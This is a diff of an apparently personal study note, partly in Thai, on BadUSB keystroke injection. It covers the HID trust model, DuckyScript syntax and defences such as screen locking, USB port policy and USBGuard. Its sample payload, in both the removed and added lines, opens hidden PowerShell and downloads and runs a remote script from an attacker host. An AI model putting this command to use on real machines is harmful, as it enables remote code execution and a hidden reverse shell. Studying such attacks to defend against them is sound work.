@@ -1,23 +1,44 @@
-# ⚡ Hardware Keystroke Injection & BadUSB Attacks
+# ⚡ Hardware Hacking & BadUSB Keystroke Injection
 
-> **Phase:** [phase-b-scripting](../) | **Tags:** `#hardware` `#badusb` `#rubberducky` `#hak5`  
+> **Phase:** `Phase B — Scripting & Recon` | **Tags:** `#hardware` `#badusb` `#physical-security` `#duckyscript`  
+> **Status:** ⏳ Upcoming | **Focus:** Keystroke Injection, Hak5 Hardware & Hot-plug Defense
 
 ---
 
 ## 📑 Core Modules Overview
-- [ ] [[#4.4 Hardware Attacks — Hak5 Hardware & BadUSB|4.4 Hak5 Hardware Arsenal (Rubber Ducky, Key Croc, LAN Turtle)]]
+
+- [ ] [[#Module 01: Physical Security & HID Trust Model|Module 01: Physical Security & HID Trust Model]]
+- [ ] [[#Module 02: DuckyScript Payloads & Execution|Module 02: DuckyScript Payloads & Execution]]
+- [ ] [[#Module 03: Hardware Attack Mitigations|Module 03: Hot-plug Attack Mitigations]]
 
 ---
 
-## 4.4 Hardware Attacks — Hak5 Hardware & BadUSB
-- **Status:** ⏳ รอคิว
-- **Core Concept:** กลไกการโจมตีแบบ Human Interface Device (HID): คอมพิวเตอร์ไว้ใจคีย์บอร์ด 100% ทำให้ BadUSB สามารถส่งคีย์ลัดเปิด Terminal และดาวน์โหลด Payload ได้ในเวลาเพียง 2 วินาที
+## Module 01: Physical Security & HID Trust Model
+- **Status:** ⏳ Not Started
+- **Core Concept:** คอมพิวเตอร์ทุกเครื่องถูกออกแบบมาให้เชื่อใจ 'คีย์บอร์ด' (Human Interface Device - HID) 100% โดยไม่มีการตรวจสอบสิทธิ์ BadUSB คือฮาร์ดแวร์ที่ปลอมตัวเป็นคีย์บอร์ดแล้วพิมพ์คำสั่งโจมตีด้วยความเร็ว 1,000 คำต่อนาที
 
-### 💻 Basic DuckyScript Syntax
+---
+
+## Module 02: DuckyScript Payloads & Execution
+- **Status:** ⏳ Not Started
+- **Core Concept:** ไวยากรณ์ DuckyScript ในการสั่งเปิด Command Prompt/PowerShell ดาวน์โหลด Payload และปิดหน้าต่างพรางตัว
+
+### 💻 Sample DuckyScript Payload
 ```text
-REM เปิด PowerShell และดาวน์โหลด Payload
+REM [Target: Windows 10/11 - Open PowerShell & Execute In-Memory Reverse Shell]
+DELAY 1000
 GUI r
 DELAY 500
-STRING powershell -WindowStyle Hidden IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')
+STRING powershell -WindowStyle Hidden -Exec Bypass -NoProfile -Command "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5/payload.ps1')"
 ENTER
 ```
+
+---
+
+## Module 03: Hardware Attack Mitigations
+- **Status:** ⏳ Not Started
+- **Core Concept:** การป้องกันทางกายภาพ: การล็อกหน้าจอเมื่อไม่อยู่ (`Win + L`), การปิดพอร์ต USB ที่ไม่จำเป็นผ่าน Group Policy (GPO), และการใช้ซอฟต์แวร์ USBGuard บน Linux
+
+### 🧠 Feynman Takeaway & Reflection
+- *สรุปด้วยคำพูดตัวเอง:* 
+- *จุดที่น่าสนใจ / ข้อควรระวัง:*
